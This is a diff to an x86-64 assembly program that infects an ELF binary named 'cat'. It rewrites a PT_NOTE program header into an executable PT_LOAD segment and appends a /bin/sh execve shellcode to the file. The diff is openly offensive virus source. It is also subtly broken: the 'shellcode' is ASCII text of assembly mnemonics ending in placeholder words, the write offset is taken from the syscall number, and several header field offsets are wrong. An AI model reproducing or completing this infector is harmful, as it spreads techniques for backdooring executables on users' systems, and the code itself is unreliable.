@@ -3,10 +3,10 @@ section .data
     mode dq 0666    ; r/w permissions for user, group and others
 
     ; File to open
-    filename db "cat_clean", 0
+    filename db "cat", 0
 
     ; Buffer to retrieve the ELF header
-    buffer_len equ 640
+    buffer_len equ 4096
     buffer times buffer_len db 0
 
     ; Messages
@@ -23,6 +23,20 @@ section .data
     miss_msg db "The provided file does not exist.", 10
     miss_len equ $ - miss_msg
 
+    ; Injection
+    shellcode db 'xor eax, eax', 10
+        db 'xor ebx, ebx', 10
+        db 'push eax', 10
+        db 'push 0x68732f6e', 10
+        db 'push 0x69622f2f', 10
+        db 'push esp', 10
+        db 'mov ebx, esp', 10
+        db 'xor ecx, ecx', 10
+        db 'xor edx, edx', 10
+        db 'execve syscall numbers'
+    shellcode_len equ $ - shellcode
+    modified_header times buffer_len db 0
+
 section .bss
     fd resq 1
     old_e_entry resq 1
@@ -30,6 +44,7 @@ section .bss
     ph_entry_size resq 1
     ph_num resq 1
     loop_counter resq 1
+    stat resb 144
 
 section .text
     global _start
@@ -123,6 +138,12 @@ is_elf:
     jmp retrieve_info
 
 retrieve_info:
+    ; Get file size
+    mov rax, 5      ; fstat
+    mov rdi, [fd]   
+    lea rsi, [stat]
+    syscall
+
     ; Retrieve information needed to infect the ELF file
     mov rsi, buffer
     add rsi, 24
@@ -142,6 +163,12 @@ retrieve_info:
     mov ax, word [rsi]  ; Get the e_phnum field
     movzx rax, ax
     mov [ph_num], rax
+
+    ; Copy the ELF header to the modified_header buffer
+    mov rsi, buffer
+    mov rdi, modified_header
+    mov rcx, buffer_len
+    rep movsb
 
     ; Parse program header
     mov rcx, [ph_num]
@@ -174,11 +201,44 @@ next_ph:
     jmp close
 
 infect:
-    ; tmp print
-    mov rax, 1
-    mov rdi, 1
-    mov rsi, elf_msg
-    mov rdx, elf_len
+    ; Change PT_NOTE to PT_LOAD
+    mov eax, [rsi]
+    and eax, 0xFFFF0000 ; Clear the last 16 bits
+    or eax, 1
+    mov [rsi], eax
+
+    ; Allow executable instructions
+    mov eax, [rsi + 12] ; Get p_flags
+    or eax, 0x1         ; Set the executable flag
+    mov [rsi + 12], eax
+
+    ; Set an address that's far enough to avoid overlapping during exec
+    mov eax, 0xc000000
+    mov [rsi + 16], eax ; Set p_vaddr
+
+    ; Set size of injected code
+    mov eax, shellcode_len
+    mov [rsi + 20], eax    ; Set p_filesz
+    mov [rsi + 24], eax    ; Set p_memsz
+
+    ; Point offset to injected code
+    mov rax, [stat + 48]    ; st_size
+    mov [rsi + 8], rax      ; Set p_offset
+
+    ; Write the shellcode to the end of the file
+    mov rax, 18            ; pwrite
+    mov rdi, [fd]          
+    lea rsi, [shellcode]   
+    mov rdx, shellcode_len
+    mov r10, rax           ; offset (file size)
+    syscall
+
+    ; Write the modified program header back to the file
+    mov rax, 18            
+    mov rdi, [fd]         
+    lea rsi, [modified_header]
+    mov rdx, buffer_len
+    mov r10, 0             ; offset (start of the file)
     syscall
 
     jmp close
